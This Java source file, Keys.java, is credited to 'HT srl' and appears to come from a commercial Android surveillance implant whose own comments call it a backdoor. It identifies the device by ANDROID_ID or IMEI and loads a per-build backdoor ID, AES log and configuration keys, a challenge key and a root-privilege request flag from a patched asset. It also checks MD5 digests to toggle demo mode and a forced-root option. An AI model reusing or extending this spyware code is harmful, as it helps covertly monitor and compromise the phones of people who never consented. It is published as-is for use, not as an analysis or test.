/* *********************************************
 * Create by : Alberto "Q" Pelliccione
 * Company   : HT srl
 * Project   : AndroidService
 * Created   : 01-dec-2010
 **********************************************/

package com.android.networking.crypto;

import java.util.Arrays;

import android.content.Context;
import android.provider.Settings.Secure;
import android.telephony.TelephonyManager;

import com.android.networking.Device;
import com.android.networking.Messages;
import com.android.networking.Status;
import com.android.networking.auto.Cfg;
import com.android.networking.interfaces.iKeys;
import com.android.networking.util.ByteArray;
import com.android.networking.util.Check;
import com.android.networking.util.Utils;

// This class should only be read by Device
/**
 * The Class Keys.
 */
public class Keys implements iKeys{
	private static final String TAG = "Keys"; //$NON-NLS-1$
	/** The singleton. */
	private static iKeys singleton;
	private static int keyLen = 16;

	// Subversion
	/** The Constant g_Subtype. */
	// private static final byte[] subtype = { 'A', 'N', 'D', 'R', 'O', 'I', 'D'
	// };
	// private static final byte[] g_Subtype = { 'A', 'N', 'D', 'R', 'O', 'I',
	// 'D' };

	// 20 bytes that uniquely identifies the device (non-static on purpose)
	/** The g_ instance id. */
	private static byte[] instanceId;

	// 16 bytes that uniquely identifies the backdoor, NULL-terminated
	/** The Constant g_BackdoorID. */
	private static byte[] backdoorId;

	// AES key used to encrypt logs
	/** The Constant g_AesKey. */
	private static byte[] aesKey;

	// AES key used to decrypt configuration
	/** The Constant g_ConfKey. */
	private static byte[] confKey;

	// Challenge key
	/** The Constant g_Challenge. */
	private static byte[] challengeKey;

	// Demo key
	private static byte[] demoMode;

	// Privilege key
	private static byte[] rootRequest;
	
	// Random seed
	private static byte[] randomSeed;

	private static Object keysLock = new Object();

	/**
	 * Self.
	 * 
	 * @return the keys
	 */
	public static iKeys self() {
		if (singleton == null) {
			synchronized (keysLock) {
				if (singleton == null) {
					if (Cfg.KEYS) {
						singleton = new Keys(true);
						if(!singleton.hasBeenBinaryPatched()){
							if (Cfg.DEBUGKEYS) {
								Check.log(TAG + " Using hardcoded keys");
							}
							singleton = new KeysFake();
						}else{
							if (Cfg.DEBUGKEYS) {
								Check.log(TAG + " Using binary patched keys");
							}
						}
						
					} else {
						singleton = new Keys(true);

						if (Cfg.DEBUGKEYS) {
							Check.log(TAG + " Using binary patched keys");
						}
					}
				}
			}
		}

		return singleton;
	}


	protected Keys(boolean fromResources) {
		if (Cfg.DEBUGKEYS) {
			Check.log(TAG + " keys " + fromResources);
		}
		String androidId = Secure.getString(Status.getAppContext().getContentResolver(), Secure.ANDROID_ID);
		if (androidId == null) {
			androidId = "EMPTY";
		}

		//20.0=9774d56d682e549c Messages.getString("20.0")
		if ("9774d56d682e549c".equals(androidId) && !Device.self().isSimulator()) { //$NON-NLS-1$
			// http://code.google.com/p/android/issues/detail?id=10603
			// http://stackoverflow.com/questions/2785485/is-there-a-unique-android-device-id
			final TelephonyManager telephonyManager = (TelephonyManager) Status.getAppContext().getSystemService(
					Context.TELEPHONY_SERVICE);

			final String imei = telephonyManager.getDeviceId();
			androidId = imei;
		}	

		if (Cfg.DEBUGKEYS) {
			Check.log(TAG + " (Keys), androidId: " + androidId);
		}

		instanceId = Digest.SHA1(androidId.getBytes());

		if (fromResources) {
			final byte[] resource = Utils.getAsset("r.bin"); // resources.bin

			// Richiediamo 16 byte ma incrementiamo di 32, e' corretto cosi
			// perche'
			// ci servono solo 16 byte
			backdoorId = ByteArray.copy(resource, 0, 14); // 14 byte
			aesKey = ByteArray.copy(resource, 14, 16); // 16 byte
			confKey = ByteArray.copy(resource, 46, 16); // 16 byte
			challengeKey = ByteArray.copy(resource, 78, 16); // 16 byte
			demoMode = ByteArray.copy(resource, 110, 24); // 24 byte
			rootRequest = ByteArray.copy(resource, 134, 16); // 16 byte
			randomSeed = ByteArray.copy(resource, 150, 16); // 16 byte

			if (Cfg.DEBUG) {
				Check.log(TAG + " backdoorId: " + new String(backdoorId));//$NON-NLS-1$
				Check.log(TAG + " aesKey: " + ByteArray.byteArrayToHex(aesKey));//$NON-NLS-1$
				Check.log(TAG + " confKey: " + ByteArray.byteArrayToHex(confKey));//$NON-NLS-1$
				Check.log(TAG + " challengeKey: " + ByteArray.byteArrayToHex(challengeKey));//$NON-NLS-1$
				Check.log(TAG + " instanceId: " + ByteArray.byteArrayToHex(instanceId));//$NON-NLS-1$
				Check.log(TAG + " demoMode: " + ByteArray.byteArrayToHex(demoMode));//$NON-NLS-1$
				Check.log(TAG + " rootMode: " + ByteArray.byteArrayToHex(rootRequest));//$NON-NLS-1$
				Check.log(TAG + " randomSeed: " + ByteArray.byteArrayToHex(randomSeed));//$NON-NLS-1$
			}

			if (isDemo()) {
				Cfg.DEMO = true;
			}
					
		}
	}

	public boolean isDemo() {
		// Pg-WaVyPzMMMMmGbhP6qAigT md5= 863d9effe70187254d3c5e9c76613a99
		byte[] demoDigest = ByteArray.hexStringToByteArray("863d9effe70187254d3c5e9c76613a99");
		byte[] calculated = Digest.MD5(demoMode);
		
		boolean ret = Arrays.equals(calculated, demoDigest);

		if (Cfg.DEBUG) {
			Check.log(TAG + "  demoMode = " + ByteArray.byteArrayToHex(demoMode));
			Check.log(TAG + "  digest = " + ByteArray.byteArrayToHex(calculated));
			Check.log(TAG + " (isDemo): " + ret); //$NON-NLS-1$
		}

		return ret;
	}

	public boolean wantsPrivilege() {
		byte[] rootDigest = new byte[] { (byte) 0x3e, (byte) 0x96, (byte) 0xb7, (byte) 0x82, (byte) 0x7e, (byte) 0x89,
				(byte) 0xda, (byte) 0xbc, (byte) 0xb5, (byte) 0x6c, (byte) 0xd3, (byte) 0x34, (byte) 0xfb, (byte) 0x70,
				(byte) 0xb8, (byte) 0xba };

		byte[] calculated = Digest.MD5(getRootRequest());

		boolean ret = Arrays.equals(calculated, rootDigest);

		if (Cfg.DEBUG) {
			Check.log(TAG + " (wantsPrivilege MD5): " + ByteArray.byteArrayToHex(calculated)); //$NON-NLS-1$
			Check.log(TAG + " (wantsPrivilege): " + ret); //$NON-NLS-1$
		}
		
		if(Cfg.FORCE_ROOT){
			return true;
		}

		return ret;
	}

	protected byte[] getRootRequest() {
		return rootRequest;
	}

	/**
	 * Check. for been binary patched. //$NON-NLS-1$
	 * 
	 * @return true, if successful
	 */
	public boolean hasBeenBinaryPatched() {
		// EMp7Ca7-fpOBIr md5=b1688ffaaaafd7c1cab52e630b53178f		
		byte[] bDigest = ByteArray.hexStringToByteArray("b1688ffaaaafd7c1cab52e630b53178f");		
		byte[] calculated = Digest.MD5(backdoorId);

		if (Cfg.DEBUG) {
			Check.log(TAG + " (hasBeenBinaryPatched) calculated MD5: " + ByteArray.byteArrayToHex(calculated));
		}
		boolean ret = !Arrays.equals(calculated, bDigest);
		return ret;
	}

	/**
	 * Gets the aes key.
	 * 
	 * @return the aes key
	 */
	public byte[] getAesKey() {
		return aesKey;
	}

	/**
	 * Gets the challenge key.
	 * 
	 * @return the challenge key
	 */
	public byte[] getChallengeKey() {
		return challengeKey;
	}

	/**
	 * Gets the conf key.
	 * 
	 * @return the conf key
	 */
	public byte[] getConfKey() {
		return confKey;
	}

	/**
	 * Gets the instance id.
	 * 
	 * @return the instance id
	 */
	public byte[] getInstanceId() {
		return instanceId;
	}

	/**
	 * Gets the builds the id.
	 * 
	 * @return the builds the id
	 */
	public byte[] getBuildId() {
		return backdoorId;
	}

	/**
	 * Gets the subtype.
	 * 
	 * @return the subtype
	 */
	static public  byte[] getSubtype() {
		if (Cfg.DEMO) {
			// 20.1=DEMO
			return ("ANDROID-" + Messages.getString("20.1")).getBytes();
		} else {
			return "ANDROID".getBytes();
		}
	}

	private static byte[] keyFromString(byte[] resource, int from, int len) {
		final byte[] res = ByteArray.copy(resource, from, len);
		byte[] ret = keyFromString(new String(res));

		if (ret == null) {
			return ByteArray.copy(resource, from, 16);
		} else {
			return ret;
		}
	}

	private static byte[] keyFromString(final String string) {
		try {
			final byte[] array = new byte[keyLen];

			for (int pos = 0; pos < keyLen; pos++) {
				final String repr = string.substring(pos * 2, pos * 2 + 2);
				array[pos] = (byte) Integer.parseInt(repr, 16);
			}

			return array;
		} catch (final Exception ex) {
			if (Cfg.EXCEPTION) {
				Check.log(ex);
			}

			return null;
		}
	}

}
